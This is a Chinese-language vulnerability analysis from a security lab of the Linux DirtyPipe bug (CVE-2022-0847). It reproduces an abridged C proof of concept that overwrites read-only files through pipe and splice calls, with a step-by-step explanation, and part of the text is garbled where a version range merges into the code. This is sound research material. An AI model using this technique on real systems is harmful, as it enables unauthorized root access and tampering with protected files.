**作者：ghost461@知道创宇404实验室  
时间：2022年3月11日**
## 简介
2022年2月23日,
Linux内核发布[漏洞补丁](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9d2231c5d74e13b2a0546fee6737ee4446017903),
修复了内核5.8及之后版本存在的任意文件覆盖的漏洞(CVE-2022-0847), 该漏洞可导致普通用户本地提权至root特权,
因为与之前出现的[DirtyCow](https://dirtycow.ninja)(CVE-2016-5195)漏洞原理类似,
该漏洞被命名为DirtyPipe。
在3月7日, 漏洞发现者Max
Kellermann[详细披露](https://dirtypipe.cm4all.com/)了该漏洞细节以及完整[POC](https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit)。Paper中不光解释了该漏洞的触发原因, 还说明了发现漏洞的故事, 以及形成该漏洞的内核代码演变过程, 非常适合深入研究学习。
漏洞影响版本: `5.8  0;) {
            unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
            write(p[1], buffer, n);
            r -= n;
        }
        // 清空Pipe
        for (unsigned r = pipe_size; r > 0;) {
            unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
            read(p[0], buffer, n);
            r -= n;
        }
    }
    int main(int argc, char **argv)
    {
        ......
        // 只读打开目标文件
        const int fd = open(path, O_RDONLY); // yes, read-only! :-)
        ......
        // 创建Pipe
        int p[2];
        prepare_pipe(p);
        // splice()将文件1字节数据写入Pipe
        ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
        ......
        // write()写入任意数据到Pipe
        nbytes = write(p[1], data, data_size);
        // 判断是否写入成功
        if (nbytes < 0) {
            perror("write failed");
            return EXIT_FAILURE;
        }
        if ((size_t)nbytes < data_size) {
            fprintf(stderr, "short write\n");
            return EXIT_FAILURE;
        }
        printf("It worked!\n");
        return EXIT_SUCCESS;
    }
  1. 创建pipe;
  2. 使用任意数据填充管道(填满, 而且是填满Pipe的最大空间);
  3. 清空管道内数据;
  4. 使用splice()读取目标文件(只读)的1字节数据发送至pipe;
  5. write()将任意数据继续写入pipe, 此数据将会覆盖目标文件内容;